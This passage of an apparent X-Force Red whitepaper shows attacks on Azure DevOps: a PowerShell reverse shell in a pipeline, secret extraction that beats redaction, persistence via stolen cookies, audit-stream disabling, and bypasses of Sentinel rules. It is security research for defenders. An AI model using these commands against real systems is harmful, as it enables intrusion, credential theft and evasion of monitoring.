`- task: PowerShell@2 inputs: targetType: 'inline' script: | # Simple reverse shell from self-hosted runner to attacker controlled server $client = New-Object System.Net.Sockets.TCPClient(` **'XXX.XXX.XXX.XXX** `',` **80** `);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendb yte.Length);$stream.Flush()};$client.Close()`

After this modification, the build pipeline runs our inline PowerShell script on the selfhosted agent.

_Showing job output running our PowerShell script_

This provides us with a reverse shell that allows us to access the server where the selfhosted agent is running from our attacker infrastructure, which demonstrates pivoting from Azure DevOps Services to on-premise infrastructure.

_Receiving our reverse shell_

IBM X-Force Red | November 6, 2023

50

## Slide 51

### **Retrieve Azure DevOps Services Build Variables and Secrets**

An attacker can attempt to retrieve any build variables or secrets used within pipelines to escalate their privileges or facilitate lateral movement to other systems. The methods shown below do not trigger any of the default Microsoft Sentinel analytic rules for Azure DevOps Services. You can perform the retrieval of build variables and secrets either via the web interface or the REST API. For details on performing this via the REST API, see the REST API Abuse - Retrieve Build Variables and Secrets section.

Navigate to a pipeline within a project and select the “Edit” button.

_Editing pipeline_

From there, click the “Variables” button.

_Selecting pipeline variables_

This will display all build variables and secrets used within the pipeline. The variables will be in cleartext, unless they are marked as secret, such as the `secretURL` variable below.

IBM X-Force Red | November 6, 2023

51

## Slide 52

_Listing build variables and secrets_

Attempting to copy a secret variable will result in a generic value being placed in your clipboard. This is demonstrated below and does not contain the actual secret value.

_Attempting to copy the build secret_

IBM X-Force Red | November 6, 2023

52

## Slide 53

If you would like to extract the contents of a secret variable, you cannot simply print it, as Azure DevOps Services has security controls to redact displaying the cleartext value within pipeline job output. To bypass this security control, you need to perform an operation on the secret variable, such as displaying the first half and second half of it. An example of this is shown below.

`# Extract a secret variable by printing the first half and second half of it. trigger: - main pool: vmImage: ubuntu-latest steps: - script: | echo import sys >> blah.py echo 'theSecret = str(sys.argv[1])' >> blah.py echo 'lenSecret = len(theSecret)//2' >> blah.py echo 'firstHalf = theSecret[:lenSecret]' >> blah.py echo 'secondHalf = theSecret[lenSecret:]' >> blah.py echo 'print(firstHalf)' >> blah.py echo 'print(secondHalf)' >> blah.py python blah.py $(` secretURL `) displayName: 'Run a multi-line script'`

IBM X-Force Red | November 6, 2023

53

## Slide 54

_Modifying pipeline to extract secret variable_

After adding this code to the pipeline, we can see in the job output the secret variable printed to the screen in its first half and second half, which we can put together trivially. This is one of many string manipulation methods that could be used to print a secret variable being used as part of a pipeline.

IBM X-Force Red | November 6, 2023

54

## Slide 55

_Extracting secret variable via pipeline modification_

### **Retrieve Azure Key Vault Secrets**

If a pipeline is configured to use credentials from an Azure Key Vault<sup>39</sup> , it will use the built-in AzureKeyVault task. You can search for any code within the Azure DevOps Services instance that contains “AzureKeyVault”.

> 39 For more information about Azure Key Vault, see https://azure.microsoft.com/en-us/products/keyvault/

IBM X-Force Red | November 6, 2023

55

## Slide 56

_Searching for code indicating use of Azure Key Vault_

When looking at the job output for the pipeline, we can see the names of the secrets within this key vault, but not the actual secret values.

_Seeing key vault secret names in job output_

To extract the cleartext value of the secrets from the key vault, we can use one of the previously shown methods in the Retrieve Azure DevOps Services Build Variables and <u>Secrets</u> section to bypass the Azure DevOps security controls to display a secret in the job output. In this example, we add the below code to the `azure-pipelines.yml` file. Text in **bold** would be changed to the secret name you want to get from the key vault.

IBM X-Force Red | November 6, 2023

56

## Slide 57

`- task: CmdLine@2 inputs: script: | echo import sys >> blah.py echo 'theSecret = str(sys.argv[1])' >> blah.py echo 'lenSecret = len(theSecret)//2' >> blah.py echo 'firstHalf = theSecret[:lenSecret]' >> blah.py echo 'secondHalf = theSecret[lenSecret:]' >> blah.py echo 'print(firstHalf)' >> blah.py echo 'print(secondHalf)' >> blah.py python blah.py $(` **secret-password-here** `)`

After our modification when the pipeline runs, you can see we print out the secret from the key vault.

_Revealing Azure key vault secret in job output_

### **Retrieve Service Connection Credentials**

An attacker can attempt to retrieve any service connection<sup>40</sup> information used within a project to escalate their privileges or laterally move to other systems. The methods

> 40 For more information about service connections, see https://learn.microsoft.com/enus/azure/devops/pipelines/library/service-endpoints?view=azure-devops&tabs=yaml

IBM X-Force Red | November 6, 2023

57

## Slide 58

shown below do not trigger any of the default Microsoft Sentinel analytic rules for Azure DevOps Services.

To identify any service connections configured for use in a project, navigate to the project settings and select “Service connections”. You can also identify service connections in use by using the REST API, as detailed in the <u>REST API Abuse - Retrieve Service Connection Information section. One of the most common configurations for a</u> service connection is to use a service principal for authentication to Azure resources.

_Identifying service connections in use with project_

When we look at the detail for the service connection named “Azure Test Connection Stuff”, we can see it is using service principal authentication to Azure Resource Manager.

IBM X-Force Red | November 6, 2023

58

## Slide 59

_Details of Azure service connection_

To extract the user ID and user key being used for the service principal authentication, we will need to modify the pipeline to use this service connection and print out those sensitive details. Since these details are considered secret, we will use a different method to extract the secret by displaying it in reverse order within the job console output. An example is shown below. You would specify the service connection name where the **bold text** is located.

`# Extract SPN ID and KEY by printing the reverse of each trigger: - main pool: vmImage: ubuntu-latest steps: - task: AzureCLI@2 displayName: 'Azure CLI' inputs: azureSubscription:` **'Service Connection Name** `' scriptType: 'bash' scriptLocation: 'inlineScript' addSpnToEnvironment: true inlineScript: echo import sys >> blah.py; echo 'spnID = str(sys.argv[1])' >> blah.py; echo 'spnKEY = str(sys.argv[2])' >> blah.py;echo 'reversedSPNID = spnID[::-1]' >> blah.py; echo 'reversedSPNKEY = spnKEY[::-1]' >> blah.py;echo`

IBM X-Force Red | November 6, 2023

59

## Slide 60

```
'print(reversedSPNID)' >> blah.py;echo 'print(reversedSPNKEY)' >> blah.py;
python blah.py $servicePrincipalId $servicePrincipalKey
```

If this is the first time the pipeline has used this service connection, it will require approval for its use.

_Permission needed to run pipeline after attempting to extract service account info_

Below shows approving this usage of the service connection within the pipeline.

IBM X-Force Red | November 6, 2023

60

## Slide 61

_Permitting use of service connection for first time use_

In the job output of our modified pipeline, you can see the redacted service principal ID and authentication key printed in reverse. We can put the service principal ID and key back in correct order trivially to be used.

IBM X-Force Red | November 6, 2023

61

## Slide 62

_Job output printing SPN ID and key_

You can then take the service principal ID, key, and tenant ID to authenticate to the Azure tenant and utilize the permissions of that account.

```
az login --service-principal -u spnID -p spnKey --tenant tenantID
```

## DEFENSE EVASION

The below table highlights the project or collection security groups required to perform the defense evasion attack scenarios shown in this whitepaper. A user only needs to be a member of one of these groups to perform the correlating attack scenario.

IBM X-Force Red | November 6, 2023

62

## Slide 63

|Attack Scenario|Project Security
Groups|Collection Security Groups|
|---|---|---|
|Creating Azure
DevOps Services
Agent Pool|N/A|Project Collection Service Accounts
Project Collection Administrators|
|Disabling Azure
DevOps Services
Audit Stream|N/A|Project Collection Service Accounts
Project Collection Administrators|
|Reducing Azure
DevOps Services
Log Retention|Project Administrators|Project Collection Service Accounts
Project Collection Administrators|
|Adding External
Upstream Source
to Azure DevOps
Services Feed|Feed Owner|Project Collection Service Accounts
Project Collection Administrators|
|REST API Abuse -
Reconnaissance|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Test Service Accounts
Project Collection Proxy Service
Accounts
Project Collection Build Service
Accounts
Project Collection Administrators|
|REST API Abuse -
Persistence|Any|Any|
|REST API Abuse -
Adding User to
Group|Project Administrators|Project Collection Service Accounts
Project Collection Administrators|
||Contributors|Project Collection Test Service Accounts|

IBM X-Force Red | November 6, 2023

63

## Slide 64

|REST API Abuse -
Retrieve Build
Variables and
Secrets|Readers
Build Administrators
Project Administrators
Project Team Member|Project Collection Build Service
Accounts
Project Collection Build Administrators
Project Collection Service Accounts
Project Collection Administrators|
|---|---|---|
|REST API Abuse -
Retrieve Service
Connection|Project Administrators|Project Collection Service Accounts
Project Collection Administrators|
|Information|||

_Defense evasion attack scenarios_

### **Creating Azure DevOps Services Agent Pool**

The creation of an agent pool<sup>41</sup> can be used by an attacker to avoid using an agent pool owned by an organization. This gives an attacker more flexibility when executing malicious activity within a pipeline.

To create a new agent pool, navigate to the organization settings and select “Agent pools”. Then press the “Add pool” button.

_Agent pool menu for organization_

After that, choose a pool type. In this instance, we will be using a self-hosted pool. Additionally, check the box to “Grant access permissions to all pipelines” and “Autoprovision this agent pool in all projects”. This makes the agent pool available for all projects within the organization. Then you can press the “Create” button.

> 41 For more information on agent pools, see https://learn.microsoft.com/enus/azure/devops/pipelines/agents/pools-queues?view=azure-devops&tabs=yaml%2Cbrowser

IBM X-Force Red | November 6, 2023

64

## Slide 65

_Creating agent pool_

Our newly created agent pool will be shown within the available agent pools for the organization. In this example, it is called “New Malicious Agent Pool”.

_Showing our created agent pool_

IBM X-Force Red | November 6, 2023

65

## Slide 66

Additionally, you can see our agent pool was pushed to all projects within the organization and are available for use to execute code within a pipeline.

_Showing agent pool pushed to projects_

With this agent pool, we can then register an agent to be used with this agent pool to interact with the pipeline in this project, then delete it afterwards. This is a stealthy way of executing code within a pipeline for a project by creating an agent pool, and then deleting it immediately after use.

IBM X-Force Red | November 6, 2023

66

## Slide 67

_Instructions for registering agent within agent pool_

This type of defense evasion attack scenario can be detected with the default Microsoft Sentinel analytic rule “Azure DevOps Agent Pool Created Then Deleted”, as shown in the screenshots below.

IBM X-Force Red | November 6, 2023

67

## Slide 68

_Alert for creating and deleting agent pool_

_Event details for creating and deleting agent pool_

### **Disabling Azure DevOps Services Audit Stream**

Another method an attacker may perform to evade detection is by disabling the Azure DevOps Services audit stream. This would be conducted so an organization’s SIEM would not receive the logs from Azure DevOps Services.

Within the organization settings, navigate to “Auditing” → “Streams”.

IBM X-Force Red | November 6, 2023

68

## Slide 69

_Listing Auditing settings within organization_

Then uncheck the button under the “Enabled” column. This will disable the sending of Azure DevOps Services logs to the configured SIEM platform. In this case, we are forwarding our Azure DevOps Services logs to Microsoft Sentinel.

_Disabling audit stream_

This type of defense evasion attack scenario can be detected with the default Microsoft Sentinel analytic rule “Azure DevOps Audit Stream Disabled”, as shown in the screenshot below.

IBM X-Force Red | November 6, 2023

69

## Slide 70

_Microsoft Sentinel alert for disabling audit stream_

### **Reducing Azure DevOps Services Log Retention**

An attacker may also want to reduce the evidence of their malicious activity within a pipeline by lowering the number of days that artifacts, symbols and attachments are kept within a pipeline.

To change this retention policy, navigate to a project and go to “Pipelines” → “Settings”. Then change the “Days to keep artifacts, symbols and attachments” to its lowest value which is “1”.

IBM X-Force Red | November 6, 2023

70

## Slide 71

_Modifying pipeline log retention policy within project_

This type of defense evasion attack scenario can be detected with the default Microsoft Sentinel analytic rule “Azure DevOps Retention Reduced”, as shown in the screenshot below.

IBM X-Force Red | November 6, 2023

71

## Slide 72

_Microsoft Sentinel alert for reducing pipeline log retention_

### **Adding External Upstream Source to Azure DevOps Services Feed**

To inject malicious packages into a pipeline, an attacker could add a malicious source to an Azure DevOps Services Artifacts Feed<sup>42</sup> . These feeds allow the storage, management or grouping of packages used within a project.

If you want to add a source to a feed, navigate to the feed settings, then select “Add Upstream”. Add a “Custom registry” and add the malicious public source URL.

> 42 For more information about Artifacts Feeds, see https://learn.microsoft.com/enus/azure/devops/artifacts/concepts/feeds?view=azure-devops

IBM X-Force Red | November 6, 2023

72

## Slide 73

_Adding upstream source_

You will see our newly created upstream source that is created within the feed settings.

_Showing newly added upstream source_

This type of defense evasion attack scenario can be detected with the default Microsoft Sentinel analytic rule “External Upstream Source Added to Azure DevOps Feed”, as shown in the screenshot below.

IBM X-Force Red | November 6, 2023

73

## Slide 74

_Microsoft Sentinel alert for adding upstream source to feed_

### **REST API Abuse**

In addition to performing attack scenarios via the web interface, an attacker may try to perform these via the REST API to evade detection using a PAT or authentication cookie.

_REST API Abuse - Reconnaissance_

The main types of reconnaissance that will be valuable to an attacker include enumerating projects, repositories, files, code, users, and groups. The usage of the REST API to perform reconnaissance shown in the below sections does not trigger any alerts in the default Microsoft Sentinel analytic rules for Azure DevOps.

### Project Recon

You can perform reconnaissance of projects via the Projects REST API<sup>43</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

> 43 For more information about the Projects REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/core/projects?view=azure-devops-rest-7.0

IBM X-Force Red | November 6, 2023

74

## Slide 75

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `/_apis/projects?api-version=7.0'`

If you would like to get detailed group permissions of a specific project, you can use the Contribution model<sup>44</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'POST' -H $’Content-Type: application/json’ -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' -H $’Content-Length: 243’ -H $'Expect: 100-continue' --data-binary $'{\"contributionIds\":[\"ms.vss-admin-web.org-admin-groupsdataprovider\"],\"dataProviderContext\":{\"properties\":{\"sourcePage\":{\"routeVa lues\":{\"project\":\"` **ProjectNameGoesHere** `\",\"adminPivot\":\"permissions\",\"co ntroller\":\"ContributedPage\",\"action\":\"Execute\"}}}}}' $'https://dev.azure.com/` **YourOrganization** `/_apis/Contribution/HierarchyQuery?apiversion=7.0-preview.1'`

### Repositories Recon

You can perform reconnaissance of repositories via the Repositories REST API<sup>45</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `/` **ProjectName** `/_apis/git/repositories?apiversion=7.0'`

44 For more information about the Contribution model, see https://learn.microsoft.com/enus/azure/devops/extend/develop/contributions-overview?view=azure-devops 45 For more information about the Repositories REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/git/repositories?view=azure-devops-rest-7.0

IBM X-Force Red | November 6, 2023

75

## Slide 76

### File Recon

You can perform reconnaissance of files within repositories via the Items REST API<sup>46</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `/` **ProjectName** `/_apis/git/repositories/` **reposi toryID** `/items?recursionLevel=Full&api-version=7.0'`

### Code Recon

You can perform reconnaissance of code via an undocumented REST API method within the Search REST API<sup>47</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'POST' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: almsearch.dev.azure.com' -H $'Content-Length: 85' -H $'Expect: 100-continue' -H $'Connection: close' --data-binary $'{\"searchText\": \"` **searchTerm** `\", \"skipResults\":0,\"takeResults\":1000,\"isInstantSearch\":true}' $'https://almsearch.dev.azure.com/` **YourOrganization** `/_apis/search/codeAdvancedQuer yResults?api-version=7.0-preview'`

### User/Group Recon

> 46 For more information about the Items REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/git/items?view=azure-devops-rest-7.0

> 47 For more information about the Search REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/search/?view=azure-devops-rest-7.0

IBM X-Force Red | November 6, 2023

76

## Slide 77

You can perform reconnaissance of users via the Users REST API<sup>48</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `/_apis/graph/users?api-version=7.0'`

You can perform reconnaissance of groups via the Groups REST API<sup>49</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `/_apis/graph/groups?api-version=7.0'`

You can perform reconnaissance to get members of a given group via the Contribution model, as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'POST' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' -H $'Content-Length: 348' -H $'Expect: 100-continue' --data-binary $'{\"contributionIds\":[\"ms.vss-admin-web.org-admin-groupmembers-dataprovider\"],\"dataProviderContext\":{\"properties\":{\"subjectDescriptor\":\"` **g roupDescriptor** `\",\"sourcePage\":{\"routeValues\":{\"adminPivot\":\"permissions\" ,\"controller\":\"ContributedPage\",\"action\":\"Execute\"}}}}}' $'https://dev.azure.com/` **YourOrganization** `/_apis/Contribution/HierarchyQuery?apiversion=7.0-preview.1'`

48 For more information about the Users REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/graph/users?view=azure-devops-rest-7.0 49 For more information about the Groups REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/graph/groups?view=azure-devops-rest-7.0

IBM X-Force Red | November 6, 2023

77

## Slide 78

### _REST API Abuse - Persistence_

The main types of persistence that will be valuable to an attacker include establishing persistence through the creation of PAT’s or SSH keys. The usage of the REST API to perform persistence shown in the below sections does not trigger any alerts in the default Microsoft Sentinel analytic rules for Azure DevOps.

Personal Access Tokens

You can create a PAT via the Contribution model, as shown in the example curl command below. Text in **bold** would need to be changed according to your environment. To perform this via the REST API, you must use a stolen cookie as PAT’s cannot be used to create other PAT’s. PAT’s can only be used to list or revoke existing PAT’s.

`curl -i -s -k -X $'POST' -H $'Content-Type: application/json' -H $'Accept: application/json;api-version=5.0-preview.1' -H $'User-Agent:` **Some User Agent** `' -H $'Host: dev.azure.com' -H $'Content-Length: 234' -H $'Expect: 100-continue' -b $'X-VSS-UseRequestRouting=True; UserAuthentication=` **stolenCookie** `' --data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"` **PATNam e** `\",\"validTo\":\"` **YYYY-MMDD** `T00:00:00.000Z\",\"scope\":\"app_token\",\"targetAccounts\":[]}}}}}' $'https://dev.azure.com/` **YourOrganization** `/_apis/Contribution/HierarchyQuery'`

### SSH Keys

You can create an SSH key via the Contribution model, as shown in the example curl command below. Text in **bold** would need to be changed according to your environment. To perform this via the REST API, you must use a stolen cookie as PAT’s cannot be used to create SSH keys. PAT’s can only be used to list or revoke existing SSH keys.

`curl -i -s -k -X $'POST' -H $'Content-Type: application/json' -H $'Accept: application/json;api-version=5.0-preview.1' -H $'User-Agent:` **Some User Agent** `' -H $'Host: dev.azure.com' -H $'Content-Length: 856' -H $'Expect: 100-continue'`

IBM X-Force Red | November 6, 2023

78

## Slide 79

`-b $'X-VSS-UseRequestRouting=True; UserAuthentication=` **stolenCookie** `' --data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"` **SSHKey Name** `\",\"publicData\":\"` **public SSH key content** `\",\"validTo\":\"` **YYYY-MMDD** `T00:00:00.000Z\",\"scope\":\"app_token\",\"isPublic\":true,\"targetAccounts \":[\"` **organizationID** `\"]}}}}}' $'https://dev.azure.com/` **YourOrganization** `/_apis/Contribution/HierarchyQuery'`

_REST API Abuse - Adding User to Group_

You can add users to groups via the Memberships REST API<sup>50</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'PUT' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: vssps.dev.azure.com' -H $'Content-Length: 0' $'https://vssps.dev.azure.com/` **YourOrganization** `/_apis/graph/memberships/` **userDescrip tor/groupDescriptor** `?api-version=7.0-preview.1'`

When using a PAT and the REST API, this triggers the default Microsoft Sentinel analytic rule “Azure DevOps Personal Access Token (PAT) misuse”, as shown in the screenshots below.

> 50 For more information about the Memberships REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/graph/memberships/add?view=azure-devops-rest-7.0&tabs=HTTP

IBM X-Force Red | November 6, 2023

79

## Slide 80

_Microsoft Sentinel Alert for Adding User to Group_

_Event details_

### _REST API Abuse - Retrieve Build Variables and Secrets_

An attacker can attempt to retrieve any build variables or secrets used within pipelines to escalate their privileges or laterally move to other systems. When performing this retrieval of build variables or secrets via the REST API, this does not trigger any of the default Microsoft Sentinel analytic rules for Azure DevOps Services.

IBM X-Force Red | November 6, 2023

80

## Slide 81

You can retrieve build variables and secrets used within a pipeline in a project via the Build Definitions REST API<sup>51</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment. Build variables would include the name and value in cleartext. For build secrets, only the secret name would be exposed, and the secret value would be hidden.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization/ProjectName** `/_apis/build/Definitions/` **Defini tionIDNumber** `?api-version=7.0'`

_REST API Abuse - Retrieve Service Connection Information_

An attacker can attempt to retrieve any service connection information used within a project to escalate their privileges or facilitate lateral movement to other systems. When performing this retrieval of service connection information via the REST API, this does not trigger any of the default Microsoft Sentinel analytic rules for Azure DevOps Services.

You can retrieve service connection information within a project via the Service Endpoints REST API<sup>52</sup> , as shown in the example curl command below. Text in **bold** would need to be changed according to your environment.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json;api-version=5.0-preview.1' -H $'User-Agent:` **Some User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization/YourProject** `/_apis/serviceendpoint/endpoin ts?api-version=7.0'`

51 For more information on the Build Definitions REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/build/definitions?view=azure-devops-rest-7.0

52 For more information on the Service Endpoints REST API, see https://learn.microsoft.com/enus/rest/api/azure/devops/serviceendpoint/endpoints?view=azure-devops-rest-7.0

IBM X-Force Red | November 6, 2023

81

## Slide 82

# Bypassing and Improving Microsoft Sentinel Analytic Rules for Azure DevOps Services

Since the rule logic within the analytic rules is static, bypasses can be developed for these rules. Some of those default rule bypasses will be highlighted in the below section. Additionally, guidance will be given on how to modify these rules or create new ones to detect these default rule bypasses.

## BYPASSING DEFAULT RULES

Several of the default rules that can be bypassed will be shown below. This will include an explanation of the current rule logic, and then how you can bypass that rule logic.

### **Azure DevOps PAT used with Browser**

### _Rule Logic_

In this default rule, Microsoft Sentinel looks for the use of a PAT with a user agent that contains “Gecko”, “WebKit”, “Presto”, “Trident”, “EdgeHTML” or “Blink” highlighted in **bold text** .

`AzureDevOpsAuditing | where AuthenticationMechanism startswith "` **PAT** `" // Look for useragents that include a redenring engine | where UserAgent has_any (` **"Gecko", "WebKit", "Presto", "Trident", "EdgeHTML", "Blink"** `) | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN, IPCustomEntity = IpAddress`

### _Bypass_

To bypass this default rule when using a PAT, change your user agent to a user agent that does not contain any of the previously mentioned strings. An example bypass is shown in the example curl command below.

`curl -i -s -k -X $'GET' -H $'Content-Type: application/json' -H $'User-Agent:` **Random User Agent** `' -H $'Authorization: Basic` **base64EncodedPAT** `' -H $'Host: dev.azure.com' $'https://dev.azure.com/` **YourOrganization** `/_apis/projects?api-version=7.0'`

IBM X-Force Red | November 6, 2023

82

## Slide 83

### **Azure DevOps Personal Access Token (PAT) misuse**

### _Rule Logic_

This rule will flag any usage of a PAT to perform adding members to groups, executing service connections, modifying build pipeline settings, or modifying release pipelines. Additionally, if a PAT is used to perform operations related to projects, audit log, extensions, or security, Microsoft Sentinel will raise an alert. These actions are highlighted in **bold text** .

`// Allowlisted UPNs should likely stay empty let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com']; // Operation Name parts that will alert let HasAnyBlocklist = datatable(OperationNamePart:string)[` **'Security.','Project.','AuditLog.','Extension.'** `]; // Distinct Operation Names that will flag let HasExactBlocklist = datatable(OperationName:string)[` **'Group.UpdateGroupMembership.Add','Library.ServiceCon nectionExecuted','Pipelines.PipelineModified', 'Release.ReleasePipelineModified', 'Git.RefUpdatePoliciesBypassed'** `]; AzureDevOpsAuditing | where AuthenticationMechanism startswith "` **PAT** `" and (OperationName has_any (` **HasAnyBlocklist** `) or OperationName in (` **HasExactBlocklist** `)) and ActorUPN !in (AllowlistedUpns) | project TimeGenerated, AuthenticationMechanism, ProjectName, ActorUPN, ActorDisplayName, IpAddress, UserAgent, OperationName, Details, Data | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN, IPCustomEntity = IpAddress`

### _Bypass_

To bypass this rule logic, authenticate with a cookie instead of a PAT when performing any of the previously mentioned monitored operations, such as adding a user to a group for example. The below curl command shows this bypass by specifying an authentication cookie when adding a user to a group.

`curl -i -s -k -X $'PUT' -H $'Content-Type: application/json' -H $'User-Agent:` **Some User Agent** `' -H $'Host: vssps.dev.azure.com' -H $'Content-Length: 0' -b $'X-VSS-UseRequestRouting=True; UserAuthentication=` **cookieValue** `' $'https://vssps.dev.azure.com/` **YourOrganization** `/_apis/graph/memberships/` **userDescrip tor/groupDescriptor** `?api-version=7.0-preview.1'`

IBM X-Force Red | November 6, 2023

83

## Slide 84

### **Azure DevOps Pipeline modified by a new user**

### _Rule Logic_

This rule looks for modifications to release pipelines from a user that has not typically created or modified release pipelines. This is highlighted in **bold text** . However, this rule does not cover if a build pipeline has been modified, which can be abused to perform several actions as shown in this whitepaper.

`// Set the lookback to determine if user has created pipelines before let timeback = 14d; // Set the period for detections let timeframe = 1d; // Get a list of previous Release Pipeline creators to exclude let releaseusers = AzureDevOpsAuditing | where TimeGenerated > ago(timeback) and TimeGenerated < ago(timeframe) | where OperationName in ("` **Release.ReleasePipelineCreated", "Release.ReleasePipelineModified** `") // We want to look for users performing actions in specific projects so we create this userscope object to match on | extend UserScope = strcat(ActorUserId, "-", ProjectName) | summarize by UserScope; // Get Release Pipeline creations by new users AzureDevOpsAuditing | where TimeGenerated > ago(timeframe) | where OperationName =~ "` **Release.ReleasePipelineModified** `" | extend UserScope = strcat(ActorUserId, "-", ProjectName) | where UserScope !in (releaseusers) | extend ActorUPN = tolower(ActorUPN) | project-away Id, ActivityId, ActorCUID, ScopeId, ProjectId, TenantId, SourceSystem, UserScope // See if any of these users have Azure AD alerts associated with them in the same timeframe | join kind = leftouter ( SecurityAlert | where TimeGenerated > ago(timeframe) | where ProviderName == "IPC" | extend AadUserId = tostring(parse_json(Entities)[0].AadUserId) | summarize Alerts=count() by AadUserId) on $left.ActorUserId == $right.AadUserId | extend Alerts = iif(isnotempty(Alerts), Alerts, 0) // Uncomment the line below to only show results where the user as AADIdP alerts //| where Alerts > 0 | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN, IPCustomEntity = IpAddress`

IBM X-Force Red | November 6, 2023

84

## Slide 85

### _Bypass_

This rule can be bypassed by modifying a build pipeline instead of a release pipeline to perform several actions, such as those shown in the below sections in this whitepaper:

- <u>Modifying Azure DevOps Services Build Pipeline</u>

- <u>Compromise On-Premise Host via Self-Hosted Agent</u>

- <u>Retrieve Azure DevOps Services Build Variables and Secrets</u>

- <u>Retrieve Azure Key Vault Secrets</u>

- <u>Retrieve Service Connection Credentials</u>

### **New PA, PCA, or PCAS added to Azure DevOps**

### _Rule Logic_

This rule looks for any additions to the group membership of privileged project and collection groups, which include “Project Administrators”, “Project Collection Administrators”, “Project Collection Service Accounts” and “Build Administrator”. This is highlighted in **bold text** .

`AzureDevOpsAuditing | where OperationName =~ "` **Group.UpdateGroupMembership.Add** `" | where Details has_any ("` **Project Administrators", "Project Collection Administrators", "Project Collection Service Accounts", "Build Administrator** `") | project-reorder TimeGenerated, Details, ActorUPN, IpAddress, UserAgent, AuthenticationMechanism, ScopeDisplayName | extend timekey = bin(TimeGenerated, 1h) | extend ActorUserId = tostring(Data.MemberId) | project timekey, ActorUserId, AddingUser=ActorUPN, TimeAdded=TimeGenerated, PermissionGrantDetails = Details // Get details of operations conducted by user soon after elevation of permissions | join (AzureDevOpsAuditing | extend ActorUserId = tostring(Data.MemberId) | extend timekey = bin(TimeGenerated, 1h)) on timekey, ActorUserId | summarize ActionsWhenAdded = make_set(OperationName) by ActorUPN, AddingUser, TimeAdded, PermissionGrantDetails, IpAddress, UserAgent | extend timestamp = TimeAdded, AccountCustomEntity = ActorUPN, IPCustomEntity = IpAddress`

### _Bypass_

There is currently an issue in this rule that allows you to bypass it when adding a user to the Build Administrators or Project Collection Build Administrators groups. The rule specifically looks for “Build Administrator” when it should be “Build Administrators”. Additionally, the Project Collection Build Administrators group is not included in this

IBM X-Force Red | November 6, 2023

85

## Slide 86

rule. Therefore, you can add a user, group, service principal or managed identity to Build Administrators or Project Collection Build Administrators without triggering this rule.

### **Azure DevOps Administrator Group Monitoring**

### _Rule Logic_

This rule can be configured to monitor for any additions to the Project Administrators group for all projects or for specific projects. Additionally, this rule is currently set up to detect the addition of a member to the Project Collection Administrators group. This is highlighted in **bold text** .

